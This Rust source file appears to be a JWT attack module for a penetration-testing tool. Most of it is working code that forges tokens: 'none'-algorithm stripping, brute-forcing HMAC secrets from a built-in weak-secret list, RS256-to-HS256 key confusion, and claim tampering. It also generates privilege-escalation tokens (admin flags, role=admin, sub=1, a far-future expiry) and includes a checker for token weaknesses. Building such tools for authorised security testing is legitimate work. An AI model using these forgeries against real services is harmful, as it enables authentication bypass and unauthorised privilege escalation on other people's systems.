//! JWT (JSON Web Token) Analysis and Attack Module
//!
//! Implements functionality similar to Burp JWT Attacker plugin.
//! Supports decoding, verification, and common attack techniques.

#![allow(dead_code)]

use anyhow::{Context, Result};
use base64::{engine::general_purpose::URL_SAFE_NO_PAD, Engine};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// JWT token structure
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct JwtToken {
    /// Original token string
    pub raw: String,
    /// Decoded header
    pub header: JwtHeader,
    /// Decoded payload (claims)
    pub payload: HashMap<String, serde_json::Value>,
    /// Signature (base64)
    pub signature: String,
    /// Whether the token is valid (signature verified)
    pub is_valid: Option<bool>,
    /// Validation error if any
    pub validation_error: Option<String>,
}

/// JWT header
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct JwtHeader {
    /// Algorithm (alg)
    pub alg: String,
    /// Token type (typ)
    #[serde(default)]
    pub typ: Option<String>,
    /// Key ID (kid)
    #[serde(default)]
    pub kid: Option<String>,
    /// Other header fields
    #[serde(flatten)]
    pub extra: HashMap<String, serde_json::Value>,
}

/// JWT attack type
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum JwtAttackType {
    /// Change algorithm to "none"
    AlgorithmNone,
    /// Bruteforce weak HMAC secrets
    WeakSecret,
    /// Key confusion (RSA to HMAC)
    KeyConfusion,
    /// Modify claims without signature
    ClaimTampering,
    /// CVE-2015-2951 - Algorithm confusion
    AlgorithmConfusion,
}

impl JwtAttackType {
    pub fn all() -> &'static [JwtAttackType] {
        &[
            JwtAttackType::AlgorithmNone,
            JwtAttackType::WeakSecret,
            JwtAttackType::KeyConfusion,
            JwtAttackType::ClaimTampering,
            JwtAttackType::AlgorithmConfusion,
        ]
    }

    pub fn name(&self) -> &'static str {
        match self {
            JwtAttackType::AlgorithmNone => "None Algorithm",
            JwtAttackType::WeakSecret => "Weak Secret",
            JwtAttackType::KeyConfusion => "Key Confusion",
            JwtAttackType::ClaimTampering => "Claim Tampering",
            JwtAttackType::AlgorithmConfusion => "Algorithm Confusion",
        }
    }

    pub fn description(&self) -> &'static str {
        match self {
            JwtAttackType::AlgorithmNone => "Set algorithm to 'none' to bypass signature verification",
            JwtAttackType::WeakSecret => "Bruteforce common weak HMAC secrets",
            JwtAttackType::KeyConfusion => "Change RS256 to HS256 using public key as secret",
            JwtAttackType::ClaimTampering => "Modify claims (exp, admin, role) without valid signature",
            JwtAttackType::AlgorithmConfusion => "Exploit algorithm confusion vulnerabilities",
        }
    }
}

/// JWT attack result
#[derive(Debug, Clone)]
pub struct JwtAttackResult {
    /// Attack type used
    pub attack_type: JwtAttackType,
    /// Modified token (forged)
    pub forged_token: String,
    /// Whether the attack succeeded
    pub success: bool,
    /// Details about the attack
    pub details: String,
    /// Found secret (if bruteforce)
    pub found_secret: Option<String>,
}

/// JWT Analyzer
pub struct JwtAnalyzer {
    /// Common weak secrets for bruteforce
    weak_secrets: Vec<String>,
}

impl JwtAnalyzer {
    /// Create a new JWT analyzer
    pub fn new() -> Self {
        Self {
            weak_secrets: Self::default_weak_secrets(),
        }
    }

    /// Get default weak secrets list
    fn default_weak_secrets() -> Vec<String> {
        vec![
            "secret".to_string(),
            "password".to_string(),
            "123456".to_string(),
            "jwt".to_string(),
            "key".to_string(),
            "private".to_string(),
            "public".to_string(),
            "test".to_string(),
            "admin".to_string(),
            "root".to_string(),
            "changeme".to_string(),
            "letmein".to_string(),
            "welcome".to_string(),
            "qwerty".to_string(),
            "abc123".to_string(),
            "password123".to_string(),
            "1234567890".to_string(),
            "supersecret".to_string(),
            "mysecret".to_string(),
            "secretkey".to_string(),
            "hmac-secret".to_string(),
            "jwt-secret".to_string(),
            "api-key".to_string(),
            "apikey".to_string(),
            "token".to_string(),
            "auth".to_string(),
            "authentication".to_string(),
            "authorization".to_string(),
            "bearer".to_string(),
            "access".to_string(),
            String::new(), // Empty secret
            " ".to_string(), // Single space
        ]
    }

    /// Add custom secrets for bruteforce
    pub fn add_secrets(&mut self, secrets: Vec<String>) {
        self.weak_secrets.extend(secrets);
    }

    /// Decode a JWT token
    pub fn decode(&self, token: &str) -> Result<JwtToken> {
        let parts: Vec<&str> = token.split('.').collect();
        if parts.len() != 3 {
            anyhow::bail!("Invalid JWT format: expected 3 parts, got {}", parts.len());
        }

        let header_json = URL_SAFE_NO_PAD
            .decode(parts[0])
            .context("Failed to decode header")?;
        let header: JwtHeader = serde_json::from_slice(&header_json)
            .context("Failed to parse header JSON")?;

        let payload_json = URL_SAFE_NO_PAD
            .decode(parts[1])
            .context("Failed to decode payload")?;
        let payload: HashMap<String, serde_json::Value> = serde_json::from_slice(&payload_json)
            .context("Failed to parse payload JSON")?;

        Ok(JwtToken {
            raw: token.to_string(),
            header,
            payload,
            signature: parts[2].to_string(),
            is_valid: None,
            validation_error: None,
        })
    }

    /// Verify a JWT signature with a given secret
    pub fn verify(&self, token: &JwtToken, secret: &str) -> bool {
        let parts: Vec<&str> = token.raw.split('.').collect();
        if parts.len() != 3 {
            return false;
        }

        let message = format!("{}.{}", parts[0], parts[1]);

        match token.header.alg.as_str() {
            "HS256" => {
                use hmac::{Hmac, Mac};
                use sha2::Sha256;

                type HmacSha256 = Hmac<Sha256>;
                if let Ok(mut mac) = HmacSha256::new_from_slice(secret.as_bytes()) {
                    mac.update(message.as_bytes());
                    let result = mac.finalize();
                    let expected = URL_SAFE_NO_PAD.encode(result.into_bytes());
                    expected == token.signature
                } else {
                    false
                }
            }
            "HS384" => {
                use hmac::{Hmac, Mac};
                use sha2::Sha384;

                type HmacSha384 = Hmac<Sha384>;
                if let Ok(mut mac) = HmacSha384::new_from_slice(secret.as_bytes()) {
                    mac.update(message.as_bytes());
                    let result = mac.finalize();
                    let expected = URL_SAFE_NO_PAD.encode(result.into_bytes());
                    expected == token.signature
                } else {
                    false
                }
            }
            "HS512" => {
                use hmac::{Hmac, Mac};
                use sha2::Sha512;

                type HmacSha512 = Hmac<Sha512>;
                if let Ok(mut mac) = HmacSha512::new_from_slice(secret.as_bytes()) {
                    mac.update(message.as_bytes());
                    let result = mac.finalize();
                    let expected = URL_SAFE_NO_PAD.encode(result.into_bytes());
                    expected == token.signature
                } else {
                    false
                }
            }
            "none" | "None" | "NONE" => {
                // "none" algorithm - signature should be empty
                token.signature.is_empty()
            }
            _ => false,
        }
    }

    /// Create token with "none" algorithm attack
    pub fn attack_none_algorithm(&self, token: &JwtToken) -> JwtAttackResult {
        // Create header with alg: none
        let mut new_header = token.header.clone();
        new_header.alg = "none".to_string();

        let header_json = serde_json::to_string(&new_header).unwrap_or_default();
        let header_b64 = URL_SAFE_NO_PAD.encode(header_json.as_bytes());

        let payload_json = serde_json::to_string(&token.payload).unwrap_or_default();
        let payload_b64 = URL_SAFE_NO_PAD.encode(payload_json.as_bytes());

        // Token with empty signature
        let forged_token = format!("{}.{}.", header_b64, payload_b64);

        JwtAttackResult {
            attack_type: JwtAttackType::AlgorithmNone,
            forged_token,
            success: true, // Need to test against target
            details: "Algorithm changed to 'none', signature removed".to_string(),
            found_secret: None,
        }
    }

    /// Bruteforce weak secrets
    pub fn attack_weak_secret(&self, token: &JwtToken) -> Vec<JwtAttackResult> {
        let mut results = Vec::new();

        // Only works for HMAC algorithms
        if !token.header.alg.starts_with("HS") {
            return results;
        }

        for secret in &self.weak_secrets {
            if self.verify(token, secret) {
                results.push(JwtAttackResult {
                    attack_type: JwtAttackType::WeakSecret,
                    forged_token: token.raw.clone(),
                    success: true,
                    details: format!("Found valid secret: '{}'", secret),
                    found_secret: Some(secret.clone()),
                });
            }
        }

        results
    }

    /// Create token with modified claims
    pub fn attack_claim_tampering(
        &self,
        token: &JwtToken,
        claim_mods: HashMap<String, serde_json::Value>,
    ) -> JwtAttackResult {
        let mut new_payload = token.payload.clone();

        // Apply modifications
        for (key, value) in &claim_mods {
            new_payload.insert(key.clone(), value.clone());
        }

        let header_json = serde_json::to_string(&token.header).unwrap_or_default();
        let header_b64 = URL_SAFE_NO_PAD.encode(header_json.as_bytes());

        let payload_json = serde_json::to_string(&new_payload).unwrap_or_default();
        let payload_b64 = URL_SAFE_NO_PAD.encode(payload_json.as_bytes());

        // Keep original signature (won't be valid, but might bypass weak implementations)
        let forged_token = format!("{}.{}.{}", header_b64, payload_b64, token.signature);

        let mods_desc: Vec<String> = claim_mods
            .iter()
            .map(|(k, v)| format!("{}={}", k, v))
            .collect();

        JwtAttackResult {
            attack_type: JwtAttackType::ClaimTampering,
            forged_token,
            success: true, // Need to test against target
            details: format!("Claims modified: {}", mods_desc.join(", ")),
            found_secret: None,
        }
    }

    /// Create token with algorithm confusion (RS256 -> HS256)
    pub fn attack_key_confusion(&self, token: &JwtToken, public_key: &str) -> JwtAttackResult {
        // Change algorithm from RS* to HS256
        let mut new_header = token.header.clone();
        new_header.alg = "HS256".to_string();

        let header_json = serde_json::to_string(&new_header).unwrap_or_default();
        let header_b64 = URL_SAFE_NO_PAD.encode(header_json.as_bytes());

        let payload_json = serde_json::to_string(&token.payload).unwrap_or_default();
        let payload_b64 = URL_SAFE_NO_PAD.encode(payload_json.as_bytes());

        // Sign with public key as HMAC secret
        let message = format!("{}.{}", header_b64, payload_b64);

        use hmac::{Hmac, Mac};
        use sha2::Sha256;
        type HmacSha256 = Hmac<Sha256>;

        let signature = if let Ok(mut mac) = HmacSha256::new_from_slice(public_key.as_bytes()) {
            mac.update(message.as_bytes());
            URL_SAFE_NO_PAD.encode(mac.finalize().into_bytes())
        } else {
            String::new()
        };

        let forged_token = format!("{}.{}.{}", header_b64, payload_b64, signature);

        JwtAttackResult {
            attack_type: JwtAttackType::KeyConfusion,
            forged_token,
            success: true, // Need to test against target
            details: "Algorithm changed from RS256 to HS256, signed with public key".to_string(),
            found_secret: None,
        }
    }

    /// Generate common privilege escalation payloads
    pub fn generate_privilege_escalation_tokens(&self, token: &JwtToken) -> Vec<JwtAttackResult> {
        let mut results = Vec::new();

        // Admin escalation attempts
        let admin_mods = vec![
            ("admin", serde_json::json!(true)),
            ("is_admin", serde_json::json!(true)),
            ("isAdmin", serde_json::json!(true)),
            ("role", serde_json::json!("admin")),
            ("roles", serde_json::json!(["admin"])),
            ("user_type", serde_json::json!("admin")),
            ("userType", serde_json::json!("admin")),
            ("privilege", serde_json::json!("admin")),
            ("access_level", serde_json::json!("admin")),
            ("accessLevel", serde_json::json!(100)),
        ];

        for (key, value) in admin_mods {
            let mut mods = HashMap::new();
            mods.insert(key.to_string(), value);
            results.push(self.attack_claim_tampering(token, mods));
        }

        // User ID manipulation (if sub claim exists)
        if let Some(_sub) = token.payload.get("sub") {
            let mut mods = HashMap::new();
            mods.insert("sub".to_string(), serde_json::json!("1")); // Try admin user ID
            results.push(self.attack_claim_tampering(token, mods));

            let mut mods = HashMap::new();
            mods.insert("sub".to_string(), serde_json::json!("admin"));
            results.push(self.attack_claim_tampering(token, mods));
        }

        // Expiration bypass
        let mut mods = HashMap::new();
        let far_future = chrono::Utc::now().timestamp() + 365 * 24 * 60 * 60; // 1 year
        mods.insert("exp".to_string(), serde_json::json!(far_future));
        results.push(self.attack_claim_tampering(token, mods));

        results
    }

    /// Analyze a token and run all attacks
    pub fn analyze(&self, token_str: &str) -> Result<JwtAnalysisReport> {
        let token = self.decode(token_str)?;

        let mut attacks = Vec::new();
        let mut vulnerabilities = Vec::new();

        // Check for inherent vulnerabilities in the token
        vulnerabilities.extend(self.detect_vulnerabilities(&token));

        // None algorithm attack
        attacks.push(self.attack_none_algorithm(&token));

        // Weak secret attack (if HMAC)
        let weak_results = self.attack_weak_secret(&token);
        if !weak_results.is_empty() {
            vulnerabilities.push(format!(
                "CRITICAL: Weak HMAC secret found - {} secret(s) work",
                weak_results.len()
            ));
        }
        attacks.extend(weak_results);

        // Privilege escalation attempts
        let priv_esc = self.generate_privilege_escalation_tokens(&token);
        attacks.extend(priv_esc);

        Ok(JwtAnalysisReport {
            token,
            attacks,
            vulnerabilities,
        })
    }

    /// Detect vulnerabilities in the JWT token structure
    fn detect_vulnerabilities(&self, token: &JwtToken) -> Vec<String> {
        let mut vulns = Vec::new();

        // Check algorithm
        match token.header.alg.to_lowercase().as_str() {
            "none" => {
                vulns.push("CRITICAL: Algorithm is 'none' - token not signed".to_string());
            }
            "hs256" | "hs384" | "hs512" => {
                vulns.push("INFO: Using HMAC algorithm - vulnerable to brute force if weak secret".to_string());
            }
            "" => {
                vulns.push("HIGH: No algorithm specified in header".to_string());
            }
            _ => {}
        }

        // Check for missing 'typ' header
        if token.header.typ.is_none() {
            vulns.push("LOW: Missing 'typ' header field".to_string());
        }

        // Check expiration claim
        if let Some(exp) = token.payload.get("exp") {
            if let Some(exp_val) = exp.as_i64() {
                let now = chrono::Utc::now().timestamp();
                if exp_val < now {
                    vulns.push("MEDIUM: Token has expired".to_string());
                } else if exp_val > now + 365 * 24 * 60 * 60 {
                    vulns.push("LOW: Token has very long expiration (>1 year)".to_string());
                }
            }
        } else {
            vulns.push("MEDIUM: No expiration claim (exp) - token never expires".to_string());
        }

        // Check for missing 'iat' (issued at)
        if token.payload.get("iat").is_none() {
            vulns.push("LOW: Missing 'iat' (issued at) claim".to_string());
        }

        // Check for missing 'nbf' (not before)
        if token.payload.get("nbf").is_none() {
            vulns.push("INFO: Missing 'nbf' (not before) claim".to_string());
        }

        // Check for sensitive data in payload
        let sensitive_keys = ["password", "secret", "key", "private_key", "api_key", "credit_card", "ssn"];
        for key in &sensitive_keys {
            if token.payload.contains_key(*key) {
                vulns.push(format!("HIGH: Potential sensitive data in payload: '{}'", key));
            }
        }

        // Check for privilege escalation vectors (existing claims)
        let priv_claims = ["admin", "is_admin", "isAdmin", "role", "roles", "privilege", "permissions"];
        for claim in &priv_claims {
            if token.payload.contains_key(*claim) {
                vulns.push(format!("INFO: Privilege-related claim found: '{}' - potential escalation target", claim));
            }
        }

        // Check if 'kid' header is present (potential injection vector)
        if let Some(kid) = &token.header.kid {
            vulns.push(format!(
                "INFO: 'kid' header present ('{}') - check for SQL/path injection vulnerabilities",
                kid
            ));
        }

        // Check for 'jku' (JWK Set URL) header - potential SSRF
        if token.header.extra.contains_key("jku") {
            vulns.push("HIGH: 'jku' header present - potential SSRF/key injection vulnerability".to_string());
        }

        // Check for 'x5u' (X.509 URL) header - potential SSRF
        if token.header.extra.contains_key("x5u") {
            vulns.push("HIGH: 'x5u' header present - potential SSRF/key injection vulnerability".to_string());
        }

        // Check for 'x5c' (X.509 certificate chain) header
        if token.header.extra.contains_key("x5c") {
            vulns.push("MEDIUM: 'x5c' header present - verify certificate chain validation".to_string());
        }

        // Check signature length for HMAC algorithms (may indicate weak key)
        if token.header.alg.starts_with("HS") && token.signature.len() < 20 {
            vulns.push("MEDIUM: Short signature - may indicate implementation issue".to_string());
        }

        vulns
    }
}

impl Default for JwtAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

/// JWT Analysis Report
#[derive(Debug, Clone)]
pub struct JwtAnalysisReport {
    /// Decoded token
    pub token: JwtToken,
    /// Attack results
    pub attacks: Vec<JwtAttackResult>,
    /// Detected vulnerabilities
    pub vulnerabilities: Vec<String>,
}

impl JwtAnalysisReport {
    /// Get successful attacks
    pub fn successful_attacks(&self) -> Vec<&JwtAttackResult> {
        self.attacks.iter().filter(|a| a.success).collect()
    }

    /// Check if any weak secret was found
    pub fn found_weak_secret(&self) -> Option<&str> {
        self.attacks
            .iter()
            .filter(|a| a.attack_type == JwtAttackType::WeakSecret)
            .find_map(|a| a.found_secret.as_deref())
    }
}

/// Sign a JWT with HMAC-SHA256
pub fn sign_hs256(header_b64: &str, payload_b64: &str, secret: &str) -> String {
    use hmac::{Hmac, Mac};
    use sha2::Sha256;
    type HmacSha256 = Hmac<Sha256>;

    let message = format!("{}.{}", header_b64, payload_b64);

    if let Ok(mut mac) = HmacSha256::new_from_slice(secret.as_bytes()) {
        mac.update(message.as_bytes());
        URL_SAFE_NO_PAD.encode(mac.finalize().into_bytes())
    } else {
        String::new()
    }
}

/// Create a new JWT token
pub fn create_token(
    claims: HashMap<String, serde_json::Value>,
    secret: &str,
    algorithm: &str,
) -> Result<String> {
    let header = JwtHeader {
        alg: algorithm.to_string(),
        typ: Some("JWT".to_string()),
        kid: None,
        extra: HashMap::new(),
    };

    let header_json = serde_json::to_string(&header)?;
    let header_b64 = URL_SAFE_NO_PAD.encode(header_json.as_bytes());

    let payload_json = serde_json::to_string(&claims)?;
    let payload_b64 = URL_SAFE_NO_PAD.encode(payload_json.as_bytes());

    let signature = match algorithm {
        "HS256" => sign_hs256(&header_b64, &payload_b64, secret),
        "none" => String::new(),
        _ => anyhow::bail!("Unsupported algorithm: {}", algorithm),
    };

    Ok(format!("{}.{}.{}", header_b64, payload_b64, signature))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_decode_jwt() {
        let analyzer = JwtAnalyzer::new();
        // Test JWT with HS256
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

        let decoded = analyzer.decode(token).unwrap();
        assert_eq!(decoded.header.alg, "HS256");
        assert_eq!(decoded.payload.get("sub").unwrap(), "1234567890");
        assert_eq!(decoded.payload.get("name").unwrap(), "John Doe");
    }

    #[test]
    fn test_verify_hs256() {
        let analyzer = JwtAnalyzer::new();
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

        let decoded = analyzer.decode(token).unwrap();
        // This token is signed with "your-256-bit-secret"
        assert!(analyzer.verify(&decoded, "your-256-bit-secret"));
        assert!(!analyzer.verify(&decoded, "wrong-secret"));
    }

    #[test]
    fn test_none_algorithm_attack() {
        let analyzer = JwtAnalyzer::new();
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U";

        let decoded = analyzer.decode(token).unwrap();
        let result = analyzer.attack_none_algorithm(&decoded);

        assert_eq!(result.attack_type, JwtAttackType::AlgorithmNone);
        assert!(result.forged_token.ends_with('.'));
    }
}
